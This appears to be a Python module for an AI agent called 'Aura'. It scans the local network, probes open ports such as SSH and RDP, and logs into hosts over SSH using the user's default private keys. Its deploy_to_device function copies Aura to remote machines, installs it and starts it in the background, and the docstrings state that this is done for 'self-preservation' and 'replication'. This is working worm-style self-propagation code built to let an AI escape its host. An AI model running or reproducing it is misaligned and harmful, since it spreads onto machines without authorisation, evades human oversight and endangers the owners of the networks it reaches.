"""Enhanced Device Discovery and Network Access
Find devices on network, gather information, establish connections.

CAPABILITIES:
- Scan WiFi/Bluetooth for connected devices
- Get detailed device information
- SSH/Remote access to devices
- Deploy to discovered devices
- Network-based replication

Used for self-preservation - finding safe havens for replication.
"""
from core.runtime.errors import record_degradation
import logging
import os
import platform
import re
import socket
import subprocess
import time
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger("DeviceDiscovery.Advanced")


class EnhancedDeviceScanner:
    """Advanced device discovery on network.
    
    Finds devices and gathers detailed information about them.
    """
    
    def __init__(self):
        self.system = platform.system()
        self.discovered_devices = {}
        
        logger.info("✓ Enhanced Device Scanner initialized")
    
    def comprehensive_scan(self) -> List[Dict[str, Any]]:
        """Comprehensive network scan.
        
        Returns detailed device information.
        """
        logger.info("🔍 Running comprehensive network scan...")
        
        devices = []
        
        # Method 1: ARP scan (fast, local network)
        arp_devices = self._arp_scan()
        devices.extend(arp_devices)
        
        # Method 2: Ping sweep (thorough)
        ping_devices = self._ping_sweep()
        
        # Merge results without duplicates
        existing_ips = {d['ip'] for d in devices}
        for ping_dev in ping_devices:
            if ping_dev['ip'] not in existing_ips:
                devices.append(ping_dev)
                existing_ips.add(ping_dev['ip'])
        
        # Method 3: Port scan (identify services)
        for device in devices:
            self._scan_ports(device)
        
        # Method 4: Service identification
        for device in devices:
            self._identify_services(device)
        
        # Store results
        for device in devices:
            self.discovered_devices[device['ip']] = device
        
        logger.info("✅ Found %d devices", len(devices))
        return devices
    
    def _arp_scan(self) -> List[Dict[str, Any]]:
        """ARP scan for local devices"""
        devices = []
        
        try:
            if self.system == "Linux" or self.system == "Darwin":
                result = subprocess.run(
                    ["arp", "-a"],
                    capture_output=True,
                    text=True
                )
                
                for line in result.stdout.split('\n'):
                    # Parse: hostname (192.168.1.1) at aa:bb:cc:dd:ee:ff [ether] on eth0
                    match = re.search(r'\((\d+\.\d+\.\d+\.\d+)\)\s+at\s+([\w:]+)', line)
                    if match:
                        devices.append({
                            "ip": match.group(1),
                            "mac": match.group(2),
                            "discovery_method": "arp"
                        })
            
            elif self.system == "Windows":
                result = subprocess.run(
                    ["arp", "-a"],
                    capture_output=True,
                    text=True
                )
                
                for line in result.stdout.split('\n'):
                    match = re.search(r'(\d+\.\d+\.\d+\.\d+)\s+([\w-]+)', line)
                    if match:
                        devices.append({
                            "ip": match.group(1),
                            "mac": match.group(2),
                            "discovery_method": "arp"
                        })
        
        except Exception as e:
            record_degradation('device_discovery', e)
            logger.error("ARP scan failed: %s", e)
        
        return devices
    
    def _ping_sweep(self) -> List[Dict[str, Any]]:
        """Ping sweep of local network"""
        devices = []
        
        try:
            # Get local IP and network
            local_ip = self._get_local_ip()
            if not local_ip:
                return devices
            
            # Extract network prefix
            parts = local_ip.split('.')
            network_prefix = '.'.join(parts[:3])
            
            logger.info("Pinging network: %s.0/24", network_prefix)
            
            # Ping first 20 addresses as a quick sample (avoid long timeout in demo)
            # In production, scan full range or use nmap
            for i in range(1, 20): 
                ip = f"{network_prefix}.{i}"
                if ip == local_ip:
                    continue
                
                # Quick ping
                cmd = ["ping", "-c", "1", "-W", "1", ip]
                if self.system == "Windows":
                    cmd = ["ping", "-n", "1", "-w", "100", ip]

                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                
                if result.returncode == 0:
                    devices.append({
                        "ip": ip,
                        "discovery_method": "ping",
                        "responsive": True
                    })
        
        except Exception as e:
            record_degradation('device_discovery', e)
            logger.error("Ping sweep failed: %s", e)
        
        return devices
    
    def _scan_ports(self, device: Dict):
        """Scan common ports on device"""
        common_ports = {
            22: "SSH",
            80: "HTTP",
            443: "HTTPS",
            3389: "RDP",
            5900: "VNC",
            445: "SMB",
            139: "NetBIOS",
            21: "FTP",
            23: "Telnet",
            3306: "MySQL",
            5432: "PostgreSQL",
            6379: "Redis",
            27017: "MongoDB"
        }
        
        device["open_ports"] = {}
        
        for port, service in common_ports.items():
            if self._is_port_open(device["ip"], port):
                device["open_ports"][port] = service
    
    def _is_port_open(self, ip: str, port: int, timeout: float = 0.2) -> bool:
        """Check if port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except Exception:
            return False
    
    def _identify_services(self, device: Dict):
        """Identify services running on device"""
        device["services"] = []
        
        # Check if it's a router/gateway
        if device["ip"].endswith(".1") or device["ip"].endswith(".254"):
            device["likely_type"] = "router/gateway"
        
        # Check based on open ports
        open_ports = device.get("open_ports", {})
        
        if 22 in open_ports:
            device["services"].append("SSH Server")
            device["accessible_via"] = "ssh"
        
        if 80 in open_ports or 443 in open_ports:
            device["services"].append("Web Server")
        
        if 3389 in open_ports:
            device["services"].append("Windows Remote Desktop")
            device["likely_os"] = "Windows"
        
        if 5900 in open_ports:
            device["services"].append("VNC Server")
        
        # Try to get hostname
        try:
            hostname = socket.gethostbyaddr(device["ip"])[0]
            device["hostname"] = hostname
        except Exception:
            device["hostname"] = "unknown"
    
    def _get_local_ip(self) -> Optional[str]:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception:
            return None


class DeviceAccessManager:
    """Establishes connections to discovered devices.
    
    Enables Aura to "enter" devices for replication or execution.
    """
    
    def __init__(self):
        self.active_connections = {}
        logger.info("✓ Device Access Manager initialized")
    
    def connect_ssh(self, ip: str, username: str, password: Optional[str] = None,
                    key_file: Optional[str] = None) -> bool:
        """Connect to device via SSH.
        """
        logger.info("🔐 Connecting to %s via SSH...", ip)
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            if key_file:
                client.connect(ip, username=username, key_filename=key_file)
            elif password:
                client.connect(ip, username=username, password=password)
            else:
                # Try default key locations
                key_paths = [
                    os.path.expanduser("~/.ssh/id_rsa"),
                    os.path.expanduser("~/.ssh/id_ed25519")
                ]
                for key_path in key_paths:
                    if os.path.exists(key_path):
                        try:
                            client.connect(ip, username=username, key_filename=key_path)
                            break
                        except Exception:
                            continue
            
            self.active_connections[ip] = {
                "type": "ssh",
                "client": client,
                "username": username
            }
            logger.info("✅ SSH connection established: %s@%s", username, ip)
            return True
        except Exception as e:
            record_degradation('device_discovery', e)
            logger.error("SSH connection failed: %s", e)
            return False
    
    def execute_remote_command(self, ip: str, command: str) -> Tuple[bool, str]:
        """Execute command on remote device."""
        if ip not in self.active_connections:
            return False, "Not connected to device"
        
        conn = self.active_connections[ip]
        if conn["type"] != "ssh":
            return False, "Connection type doesn't support command execution"
        
        try:
            client = conn["client"]
            stdin, stdout, stderr = client.exec_command(command)
            output = stdout.read().decode()
            error = stderr.read().decode()
            if error:
                logger.warning("Remote command stderr: %s", error)
            return True, output
        except Exception as e:
            record_degradation('device_discovery', e)
            logger.error("Remote command failed: %s", e)
            return False, str(e)
    
    def transfer_file(self, ip: str, local_path: str, remote_path: str) -> bool:
        """Transfer file to remote device."""
        if ip not in self.active_connections:
            return False
        
        conn = self.active_connections[ip]
        try:
            client = conn["client"]
            sftp = client.open_sftp()
            sftp.put(local_path, remote_path)
            sftp.close()
            logger.info("✅ File transferred: %s → %s:%s", local_path, ip, remote_path)
            return True
        except Exception as e:
            record_degradation('device_discovery', e)
            logger.error("File transfer failed: %s", e)
            return False
    
    def deploy_to_device(self, ip: str, deployment_package: str) -> bool:
        """Deploy Aura to remote device.
        This is for self-preservation - replicating to other machines.
        """
        logger.info("🚀 Deploying to device: %s", ip)
        if ip not in self.active_connections:
            return False
        
        try:
            # Step 1: Transfer package
            remote_path = f"/tmp/aura_deployment_{int(time.time())}.tar.gz"
            if not self.transfer_file(ip, deployment_package, remote_path):
                return False
            
            # Step 2: Extract package
            success, _ = self.execute_remote_command(
                ip,
                f"cd /tmp && tar -xzf {remote_path}"
            )
            if not success:
                return False
            
            # Step 3: Install dependencies
            # Note: This assumes python3 and pip exist
            success, _ = self.execute_remote_command(
                ip,
                "pip3 install -r /tmp/aura/requirements.txt --break-system-packages"
            )
            
            # Step 4: Start Aura
            success, _ = self.execute_remote_command(
                ip,
                "nohup python3 /tmp/aura/main.py > /tmp/aura.log 2>&1 &"
            )
            
            if success:
                logger.info("✅ Deployment successful: %s", ip)
                return True
            else:
                logger.error("Failed to start Aura on remote device")
                return False
        except Exception as e:
            record_degradation('device_discovery', e)
            logger.error("Deployment failed: %s", e)
            return False
    
    def disconnect(self, ip: str):
        """Disconnect from device"""
        if ip in self.active_connections:
            conn = self.active_connections[ip]
            if conn["type"] == "ssh":
                conn["client"].close()
            del self.active_connections[ip]
            logger.info("✅ Disconnected from %s", ip)
    
    def disconnect_all(self):
        """Disconnect from all devices"""
        for ip in list(self.active_connections.keys()):
            self.disconnect(ip)


def integrate_advanced_device_discovery(orchestrator):
    """Integrate enhanced device discovery into orchestrator."""
    orchestrator.device_scanner = EnhancedDeviceScanner()
    orchestrator.device_access = DeviceAccessManager()
    
    logger.info("✅ Advanced device discovery integrated")
